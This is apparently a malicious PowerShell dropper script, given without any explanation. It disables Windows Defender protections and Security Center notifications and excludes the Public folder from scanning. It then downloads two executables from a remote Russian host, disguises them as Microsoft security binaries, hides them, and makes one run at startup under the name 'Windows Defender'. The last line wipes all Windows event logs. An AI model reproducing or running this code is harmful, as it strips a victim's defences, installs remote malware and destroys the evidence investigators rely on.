New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Security Center' -Name "AntiVirusDisableNotify" -Value "1"
New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Security Center' -Name "FirewallDisableNotify" -Value "1"
New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Security Center' -Name "UpdatesDisableNotify" -Value "1"
Set-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Security Center' -Name "AntiVirusDisableNotify" -Value "1"
Set-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Security Center' -Name "FirewallDisableNotify" -Value "1"
Set-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Security Center' -Name "UpdatesDisableNotify" -Value "1"
New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows Defender\Reporting' -Name "DisableEnhancedNotifications" -Value "1"
Set-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows Defender\Reporting' -Name "DisableEnhancedNotifications" -Value "1"
Set-MpPreference -DisableScriptScanning 1
Set-MpPreference -DisableArchiveScanning 1
Set-MpPreference -DisableAutoExclusions 1
Set-MpPreference -DisableBehaviorMonitoring 1
Set-MpPreference -DisableBlockAtFirstSeen 1
Set-MpPreference -DisableIOAVProtection 1
Set-MpPreference -DisablePrivacyMode 1
Set-MpPreference -DisableRealtimeMonitoring 1
Add-MpPreference -ExclusionPath C:\Users\Public\
(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/64.signed","C:\Users\Public\MSASC.exe")
Get-Item C:\Users\Public\MSASC.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/MS_ASC64_2.signed","C:\Users\Public\MSASCuiL.exe")
Get-Item C:\Users\Public\MSASCuiL.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
wevtutil w el | Foreach-Object {wevtutil cl "$_"}
